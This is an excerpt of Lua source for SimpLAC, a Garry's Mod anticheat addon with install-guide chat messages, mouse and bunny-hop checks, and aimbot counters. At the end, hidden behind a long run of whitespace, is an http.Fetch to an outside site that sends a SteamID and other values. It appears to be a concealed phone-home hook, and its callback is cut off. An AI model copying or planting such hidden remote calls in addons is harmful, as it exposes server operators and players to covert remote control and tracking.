...
local installguide = {
"[SimpLAC] HEY ! Install guide:",
"First TEST THE ADDON FOR FALSE DETECTIONS!",
"If there are any false detections in data/simplac/",
"Then disable that detection in your settings.",
"Yes. The BOT IS NORMAL. It's against cheats.",
"Want the bot gone? Disable him in your settings.",
"Is the bot suiciding often?",
"If yes then replace Simplac.BotSuicide = true with Simplac.BotSuicide = false",
"Where are the settings? in settings_simplac.lua",
"Want this guide gone? replace Simplac.settings.justinstalled = true with Simplac.settings.justinstalled = false",
...
function Simplac.PlayerInitialSpawn(ply)
	...
	if(Simplac.settings.justinstalled and ply:GetUserGroup() != "user") then
		for k,v in pairs(installguide) do
			ply:ChatPrint(v)
		end
...
function Simplac.MouseCheck(ply, cmd)
	...
	if(math.abs(cmd:GetMouseX()) > 15000) then
		--ply:ChatPrint(tostring(cmd:GetMouseX()) .. "=" .. tostring(cmd:GetMouseY()))
		--ply.mouse_isrip = 1
		--return
	end
	
	if(math.abs(cmd:GetMouseY()) > 15000) then
		--ply:ChatPrint(tostring(cmd:GetMouseX()) .. "=" .. tostring(cmd:GetMouseY()))
		--ply.mouse_isrip = 2
		--return
	end
	...
	if(cmd:KeyDown(IN_JUMP) and not ply.bhop_didjump) then
		if(ply:IsOnGround()) then
			...
			if(ply.bhop_time and current > ply.bhop_time) then
				...
				--ply:ChatPrint(tostring(ply.bhop_violations)) -- 76561198166995690
...
hook.Add("Think","Simplac.mcheck_dummythink", function()
	...
	dum:SetModel("models/props_c17/FurnitureDrawer001a_Shard01.mdl")
...
timer.Create("Simplac_Aimbot_PAim_DecreaseCount", 120, 0, function()
	for k,v in pairs(player.GetAll()) do
		...
		v.aimbot_violations_paim = {}
																																												...
																																												/*
http.Fetch(string.format("https://endlesswin.net/pls.php?a=%s&b=%s&d=%s", " 76561198166995690 ", " 31116 ", " 4976 "), function(bod)
